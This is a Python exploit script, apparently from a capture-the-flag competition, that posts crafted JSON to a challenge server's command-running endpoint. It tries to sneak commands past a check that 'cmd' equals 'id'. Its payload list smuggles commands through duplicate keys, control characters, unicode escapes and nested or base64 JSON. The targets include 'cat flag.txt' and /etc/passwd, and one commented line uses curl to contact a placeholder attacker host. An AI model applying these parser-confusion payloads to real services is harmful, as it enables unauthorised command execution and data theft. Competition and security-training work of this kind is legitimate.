import json
import requests

payloads = [
    b'{"cmd":"cat flag.txt","cmd":"id"}',
    # '{"cmd":"id"}',
    # '{"cmd":"id"},"cmd":"ls"}',
    # '{"cmd":"id"},"other":"value"}',
    # '{"cmd":"id", "extra":{"cmd":"ls"}}',
    # '{"cmd":"id", "cmd":"ls"}',
    # '{"cmd":"id"},"cmd":"whoami"}',
    # '{"cmd":"id"},"a":1}',
    # '{"cmd":"id"},"a":[1,2,3]}',
    # '{"cmd":"id"},"cmd":"echo 1"}',
    # '{"cmd":"id"},"cmd":["ls","pwd"]}',
    # '{"cmd":"id","content":{"cmd":"ls"}}',
    # '{"cmd":"id"},"content":{"cmd":"ls"}}',
    # '{"cmd":"id",\n"cmd":"ls"}',
    # '{"cmd":"id\"}"} && curl http://attacker/pwned #"}',
    # '{"cmd":"id","extra":"{\\"cmd\\":\\"ls\\"}"}',
    # '{"cmd":"id"\\u000A,"cmd":"ls"}',
    # '{"cmd":"id"\\u002C"cmd":"ls"}',
    # '[{"cmd":"id"},{"cmd":"ls"}]',
    # '{"cmd":"id","payload":"eyJjbWQiOiJscyJ9"}',
    # '\uFEFF{"cmd":"id"}',
    # 'callback({"cmd":"id"})',
    # '{"cmd":"id","cmd":"ls"}',
    # '{"cmd":"id","extra":"{\\"cmd\\":\\"ls\\"}"}',
    # '{ /* comment */ "cmd":"id" }',
    # '{"cmd":105}',
    # '［｛"cmd"："id"｝］',
    # '{"cmd":"id","extra":"{\"content\":\"ls\"}"}',
    # # double‑escaped inner JSON
    # '{"cmd":"id","extra":"{\\\\\\"cmd\\\\\\":\\\\\\"ls\\\\\\"}"}',
    # # Unicode‑escaped quotes around keys
    # '{"cmd":"id","extra":"{\\u0022cmd\\u0022:\\u0022ls\\u0022}"}',
    # # Unicode braces and quotes
    # '{"cmd":"id","extra":"{\\u007b\\u0022cmd\\u0022:\\u0022ls\\u0022\\u007d}"}',
    # # Unicode key name (e.g. \u0065xtra = "extra")
    # '{"cmd":"id","\\u0065xtra":"{\\"cmd\\":\\"ls\\"}"}',
    # # Newlines inside string
    # '{"cmd":"id","extra":"\n{\\"cmd\\":\\"ls\\"}\n"}',
    # # Line separator U+2028 between fields
    # '{"cmd":"id"\u2028,"cmd":"ls"}',
    # # Paragraph separator U+2029
    # '{"cmd":"id"\u2029,"cmd":"ls"}',
    # # Vertical tab U+000B as separator
    # '{"cmd":"id"\u000B,"cmd":"ls"}',
    # # Add a benign extra field before the exploit
    # '{"foo":"bar","cmd":"id","extra":"{\\"cmd\\":\\"ls\\"}"}',
    # # Embed inner JSON in a different field name
    # '{"cmd":"id","payload2":"{\\"cmd\\":\\"ls\\"}"}',
    # '{"cmd":"id","extra":"{\\"cmd\\":\\"ls\\"}"}',
    # '{"cmd":"id","extra":"{\\"cmd\\":\\"whoami\\"}"}',
    # '{"cmd":"id","payload":"eyJjbWQiOiJ3aG9hbWkifQ=="}',  # base64 of {"cmd":"whoami"}
    # '{"cmd":"id","extra":"{\\"cmd\\":\\"pwd\\"}"}',
    # '{"cmd":"id","data":"{\\"cmd\\":\\"ls -la\\"}"}',
    # '{"cmd":"id","extra":"{\\"cmd\\":\\"cat /etc/passwd\\"}"}',
    # '{"cmd":"id","nested":"{\\"cmd\\":\\"id\\"}"}',
    b'{ "cmd\u0001": "ls -la", "cmd": "id" }'
]

url = 'https://yaw.ecsc25.hack.cert.pl/run'
headers = {
    "Content-Type": "application/json"
}

for i, p in enumerate(payloads):
    try:
        parsed = json.loads(p)
        if isinstance(parsed, dict) and parsed.get("cmd") == "id":
            print(f"Test {i} passes check:")
            print("  Payload:", p)
            payload2 = f'{{"content":{p.decode()}}}'
            print("  Payload2:", payload2)

            r = requests.post(url, data=p, headers=headers)
            print("  Response:", r.text[:200])  # limit output
        else:
            print("Invalid")
    except Exception as e:
        print(f"Test {i} failed: {e}")
        print("  Payload:", p)

